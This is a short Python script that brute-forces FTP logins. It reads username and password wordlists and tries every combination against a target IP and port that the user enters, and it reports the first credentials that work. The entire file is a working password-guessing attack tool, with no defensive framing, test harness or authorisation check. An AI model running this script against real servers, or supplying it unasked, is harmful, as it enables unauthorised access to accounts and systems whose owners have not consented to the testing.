import ftplib
import sys
import os

def ftp_bruteforce(target_ip, target_port, username_file, password_file):
    with open(username_file, 'r') as f:
        usernames = f.read().splitlines()

    with open(password_file, 'r') as f:
        passwords = f.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target_ip, port=target_port)
                ftp.login(username, password)
                print(f"[+] Valid credentials found: {username}:{password}")
                ftp.quit()
                return
            except ftplib.error_perm:
                print(f"[-] Invalid credentials: {username}:{password}")
            except ftplib.all_errors:
                print(f"[-] Failed to connect to {target_ip}:{target_port}")
                return

    print("[-] No valid credentials found.")

if __name__ == '__main__':
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))
    username_file = input("Enter the path to the username wordlist: ")
    password_file = input("Enter the path to the password wordlist: ")

    if not os.path.isfile(username_file) or not os.path.isfile(password_file):
        print("[-] Username or password wordlist file not found.")
        sys.exit(1)

    ftp_bruteforce(target_ip, target_port, username_file, password_file)